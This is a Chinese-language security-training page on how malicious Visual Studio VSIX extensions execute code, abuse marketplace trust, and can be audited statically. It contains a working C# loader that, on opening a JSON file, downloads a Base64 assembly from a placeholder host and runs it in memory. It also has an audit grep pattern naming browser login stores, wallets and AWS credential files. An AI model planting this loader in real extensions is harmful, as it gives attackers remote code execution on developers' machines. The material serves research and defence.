# Visual Studio VSIX Extension 滥用

{{#include ../banners/hacktricks-training.md}}

Visual Studio 扩展可以将日常编辑器操作变成以已登录用户身份执行的代码。恶意 VSIX、仿冒发布者或遭入侵的扩展更新，都可以通过常规安装渠道触达该用户。需要管理员提示的安装属于经用户同意的安装方式，并非自动提权。<sup>[[1]](#references)</sup>

## 执行模型

传统的 VSSDK 扩展通常在 `devenv.exe` 中执行。较新的 `VisualStudio.Extensibility` 模型主要让现代 .NET 扩展在进程外运行：Visual Studio 会将调用转发给专用的 `Microsoft.ServiceHub.Host.Extensibility` 进程，以隔离 IDE 稳定性问题，但**不会**将扩展与用户的 Windows 权限隔离。具体的可执行文件名称可能包含架构后缀，例如 `ServiceHub.Host.Extensibility.arm64.exe`。<sup>[[1]](#references)[[2]](#references)</sup>

### 在常规编辑器操作时触发

扩展可以实现 `ITextViewOpenClosedListener`，而不是只提供显眼的菜单命令。对于匹配的文档，系统会调用其 `TextViewOpenedAsync` 回调；`TextViewExtensionConfiguration.AppliesTo` 则可以将激活范围限制为 JSON 等常见类型。真正的格式化工具或 linter 仍可执行其宣传的功能，同时在文件打开时将另一个操作作为副作用运行。<sup>[[1]](#references)[[3]](#references)</sup>

以下精简示例展示了关键执行点；为清晰起见，其中省略了合法的格式化程序和错误处理。<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>由事件触发的内存中托管程序集加载器</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

此链会下载 Base64 文本，将其解码为程序集字节，通过可回收的 `AssemblyLoadContext` 从 `MemoryStream` 加载，再使用反射调用 `EntryPoint`（参数可以为空，也可以是 `string[]`），等待异步入口点执行完成，最后卸载上下文。第二阶段不会写入磁盘，但 VSIX 和主扩展 DLL 仍会留在磁盘上。Base64 不提供真实性或机密性；使用 HTTP 还允许链路上的攻击者替换响应。<sup>[[1]](#references)</sup>

操作上的变体包括抑制所有异常，以便在暂存失败时仍继续提供所宣传的功能，或使用 `ITextViewChangedListener` 在编辑后触发。代码在扩展宿主中执行，并可使用该用户可用的托管 API、P/Invoke、文件、凭据和子进程。<sup>[[1]](#references)</sup>

有关基于原生插件自动加载的相关编辑器特定执行面，请参阅：

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace 和分发渠道信任滥用

VSIX 可以通过直接分享/钓鱼文件、Web Marketplace 或 Visual Studio 内嵌的 Marketplace 浏览器分发。发布者注册机制主要用于确保名称唯一并限制保留词，因此可能允许容易造成视觉混淆的发布者身份；攻陷已受信任的发布者或扩展则更为有效，因为这样可以继承现有的安装用户群。通过 Marketplace 安装时，会调用 Visual Studio Installer，并将下载的 VSIX 临时放在 `%LOCALAPPDATA%\Temp` 下；`payload.vsix` 也是合法使用的文件名，因此仅凭文件名无法作为判断依据。<sup>[[1]](#references)</sup>

MDSec 未发现可以直接安装扩展的 Visual Studio URL 协议。操作者仍需让用户安装/信任 VSIX，或者攻陷现有扩展的分发渠道。`AllUsers` 包会安装到 Visual Studio 安装文件夹下，并可能请求提升权限，但这是正常的、经用户同意的安装程序行为，并非自动获取管理员或 SYSTEM 权限的途径。<sup>[[1]](#references)[[4]](#references)</sup>

### 大规模静态审计

VSIX 包通常是 ZIP 容器，因此安全的 Marketplace 审查流程可以枚举软件包、**不加载扩展代码**地解压文件、解析清单、识别可执行面，并使用 `ilspycmd` 反编译托管程序集。排除常见的捆绑依赖项后，应优先检查扩展自有程序集，再将凭据存储相关字符串与行为特征组合关联起来，例如读取文件并发送网络数据、编码并发送、下载并执行、访问凭据管理器并进行网络通信，或截屏并发送。<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

同时盘点原生 DLL、MSBuild targets、脚本、T4 模板和安装程序载荷，不要假设所有执行面都属于托管代码。将可疑行为与清单声明的用途进行比较；遥测和合法更新程序也可能看起来像数据外传或 staging。仅进行静态审查会漏掉加壳、混淆、动态解析和休眠代码；只审查最新版本则会漏掉历史版本中的恶意发布。<sup>[[1]](#references)</sup>

VS Code 使用不同的扩展宿主和清单。有关会触发自动安装 VS Code 扩展的可写共享目录，请参阅 [VS Code extension drop-share execution](vscode-extension-abuse.md)。

另一种项目加载攻击可以在不安装 VSIX 的情况下执行恶意的 [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md)。<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - 重新审视 Visual Studio 扩展](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - 关于 VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX 包的组成](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET 工具](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel 行动针对伊拉克基础设施](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
